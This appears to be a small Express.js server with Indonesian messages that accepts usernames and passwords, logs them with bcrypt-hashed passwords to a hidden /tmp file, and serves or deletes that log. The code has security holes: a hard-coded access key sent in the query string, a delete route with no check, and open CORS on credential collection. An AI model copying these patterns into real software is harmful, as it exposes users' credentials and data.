const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');
const bcrypt = require('bcrypt');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(bodyParser.json());

app.post('/simpan', async (req, res) => {
  const { username, password } = req.body;
  const logPath = path.join('/tmp', '.authdata.log');

  try {
    const hashedPassword = await bcrypt.hash(password, 10);
    const logData = `Username: ${username}, PasswordHash: ${hashedPassword}\n`;

    fs.appendFile(logPath, logData, (err) => {
      if (err) {
        console.error('Gagal simpan:', err);
        return res.status(500).send('Gagal simpan data');
      }
      res.send('Berhasil disimpan ke server!');
    });
  } catch (err) {
    console.error('Gagal hash password:', err);
    res.status(500).send('Gagal proses data');
  }
});

app.get('/', (req, res) => res.send("API aktif bro!"));

// ✅ Route lihat isi log (dengan kunci rahasia)
app.get('/lihat-log', (req, res) => {
  const kunci = req.query.kunci;
  if (kunci !== 'elzio-xavier') {
    return res.status(403).send('Akses ditolak!');
  }

  const logPath = path.join('/tmp', '.authdata.log');
  fs.readFile(logPath, 'utf8', (err, data) => {
    if (err) {
      console.error('Gagal baca log:', err);
      return res.status(500).send('Gagal baca log');
    }
    res.setHeader('Content-Type', 'text/plain');
    res.send(data);
  });
});

// ✅ Route hapus log (juga bisa pakai kunci nanti kalau mau)
app.get('/hapus-log', (req, res) => {
  const logPath = path.join('/tmp', '.authdata.log');
  fs.unlink(logPath, (err) => {
    if (err) {
      console.error('Gagal hapus log:', err);
      return res.status(500).send('Gagal hapus log atau file tidak ditemukan');
    }
    res.send('Log berhasil dihapus!');
  });
});

app.listen(PORT, () => {
  console.log(`Server aktif di port ${PORT}`);
});
